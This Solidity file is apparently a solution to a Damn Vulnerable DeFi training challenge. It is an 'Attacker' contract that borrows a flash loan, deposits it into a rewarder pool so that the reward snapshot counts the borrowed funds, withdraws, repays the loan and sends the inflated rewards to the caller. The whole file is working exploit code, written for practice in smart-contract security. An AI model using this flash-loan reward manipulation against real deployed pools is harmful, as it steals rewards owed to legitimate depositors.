// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./TheRewarderPool.sol";
import "./FlashLoanerPool.sol";

// add your exploiter contract here
contract Attacker {
    TheRewarderPool private rewarderPool;
    FlashLoanerPool private flashLoanPool;
    DamnValuableToken private liquidityToken;

    constructor(TheRewarderPool rewarderPool_, FlashLoanerPool flashLoanPool_, DamnValuableToken liquidityToken_) {
        rewarderPool = rewarderPool_;
        flashLoanPool = flashLoanPool_;
        liquidityToken = liquidityToken_;
    }
    /**
     * Step 1: take the flash loan
     * Step 2: deposit liquidity token into the rewarder pool. This would take a snapshot of balances.
     * and distribute rewards. The rewards would be very high since they are calculated based on the deposit during snapshot 
     * Step 3: Withdraw and pay back the flashloan 
     */
    function exploit() public {
        // take flash loan
        uint256 liquidityInFlashPool = liquidityToken.balanceOf(address(flashLoanPool));
        flashLoanPool.flashLoan(liquidityInFlashPool);

        rewarderPool.rewardToken().transfer(
            msg.sender,
            rewarderPool.rewardToken().balanceOf(address(this))
            );
    }

    function receiveFlashLoan(uint256 amount) public {
        require(msg.sender == address(flashLoanPool), "unauthorized");

        liquidityToken.approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);
        rewarderPool.withdraw(amount);
        liquidityToken.transfer(msg.sender, amount);
    }
}